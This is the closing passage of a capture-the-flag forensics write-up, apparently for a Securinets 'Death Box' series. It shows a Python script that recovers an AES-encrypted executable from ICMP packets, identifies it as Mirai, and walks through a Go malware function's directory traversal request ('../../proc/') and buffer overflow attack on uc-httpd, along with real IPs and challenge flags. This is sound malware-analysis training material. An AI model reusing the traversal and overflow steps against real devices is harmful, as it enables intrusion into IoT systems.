        print(f"[-] Error reading pcap: {e}")
        return None
    
    if not packets:
        print("[-] No ICMP Echo Request packets found")
        return None
    
    # Sort by sequence number and concatenate
    print(f"[+] Found {len(packets)} packets")
    
    assembled = b''
    for seq in sorted(packets.keys()):
        assembled += packets[seq]
    
    print(f"[+] Reassembled {len(assembled)} bytes")
    
    # The data is hex-encoded, so decode it
    try:
        # Remove any potential non-hex characters
        hex_data = assembled.replace(b' ', b'').replace(b':', b'')
        encrypted_bytes = binascii.unhexlify(hex_data)
        print(f"[+] Hex decoded to {len(encrypted_bytes)} bytes")
        return encrypted_bytes
    except binascii.Error:
        print("[-] Data is not hex encoded, returning raw")
        return assembled

def main():
    # Extract encrypted data from pcap
    encrypted_data = extract_icmp_data(PCAP_FILE)
    
    if not encrypted_data:
        return
    
    print(f"[+] Decrypting with key from flag...")
    
    try:
        # Decrypt
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_padded = cipher.decrypt(encrypted_data)
        
        # Unpad
        decrypted = unpad(decrypted_padded, AES.block_size)
        
        # Save to file
        with open(OUTPUT_FILE, 'wb') as f:
            f.write(decrypted)
        
        print(f"[+] Decrypted {len(decrypted)} bytes")
        print(f"[+] Saved to {OUTPUT_FILE}")
        
        # Check file type
        if decrypted[:4] == b'MZ':
            print("[+] File is PE executable (Windows)")
        elif decrypted[:4] == b'\x7fELF':
            print("[+] File is ELF executable (Linux)")
        
    except ValueError as e:
        print(f"[-] Decryption failed: {e}")
        print("[-] Wrong key? Padding error?")
```

Upon analyzing the binary, we determined that it functions as a botnet designed to scan networked devices — such as IP cameras and routers — and attempt exploitation using approximately 30 known vulnerabilities. This indicates both automated reconnaissance and multi-vector exploitation capabilities. Based on research and available information, this malware belongs to the Mirai family, a well-known botnet that targets IoT devices.

So the flag is : Securinets{Mirai_824904182e863288f24a2d13273a3122bd8fef73fe6ae1a2429ec7073177b747}

- Death Box 22

![](/assets/posts/death-box/Grh_4RPE3KgLnad_GYXruw.png)

Death Box 22
{: .img-caption}

Moving now to server2.pcap . We can find the flag by filtering with http.

![](/assets/posts/death-box/xISona6V4i2l4HSe1wl5HA.png)

FLAG > Securinets{146.190.198.112_185.133.121.127}

- Death Box 23

![](/assets/posts/death-box/QuO1nwhQ4jT7qegg1A6HUg.png)

Death Box 23
{: .img-caption}

The first server was a honeypot.

The second server was our target server . so filter with http && ip.addr == 185.133.121.127

![](/assets/posts/death-box/MIgben2Yz2xLK3cdcZLgtw.png)

then the flag is Securinets{uc-httpd 1.0.0}

- Death Box 24

![](/assets/posts/death-box/BDQZqmaE_g7g1EyPEeKI9g.png)

Death Box 24
{: .img-caption}

Analysis of the previous screenshot indicates that the attacker attempted a buffer overflow via the username field, suggesting that the login endpoint may be vulnerable. Capture and extract the relevant payload from Wireshark for further investigation.

Luckily , we got our flag : Securinets{hxxp://185[.]133.121[.]127:8099/Login[.]htm}

- Death Box 25

![](/assets/posts/death-box/D8sgHFdtpZWdsKAeiNdfmw.png)

Death Box 25
{: .img-caption}

This question also involves reverse engineering the Go (Golang) malware to fully understand its behavior and functionality.
Our target server is uc-httpd . so we will be exploring this function : main_infectFunctionUchttpd

![](/assets/posts/death-box/Ahvz8gs6p2dJ_R-6vK1sSA.png)

In this function, the malware connects to the target and sends the request GET ../../proc/ HTTP\r\n\r\n, which represents a directory traversal attempt against uchttpd. It then reads the HTTP response, searches for the string “Index of /mnt/web/”, parses the returned directory listing, and extracts potential process IDs. For each candidate PID discovered, it calls ucSofiaCheck to validate the target. If the check is successful, the malware proceeds with further exploitation steps by invoking main_ucGuessSmaps to infer memory layout details and finally main_ucSendBof to deliver the buffer overflow payload.

Then our flag is Securinets{ucSofiaCheck}

- Death Box 26

![](/assets/posts/death-box/y9HhaUwrtm8v3XOIzrYJIQ.png)

Death Box 26
{: .img-caption}

Just search for this vulnerability online.

![](/assets/posts/death-box/o-DLKcGd-LCBpEHqSm39ww.png)

Then the flag is Securinets{CVE-2018–10088}

In conclusion, this series allowed us to fully analyze and understand the attacker exploitation chain, from reconnaissance to privilege escalation to malware delivery, offering a comprehensive understanding of malware behavior and exploitation techniques.

**Thank you to everyone who played and enjoyed the series and special thanks for The Hood restaurant for the inspiration.**

![](/assets/posts/death-box/njEOtMTKJ2LAgApvTQQNDg.jpeg)

**See you soon!** — Zyyz
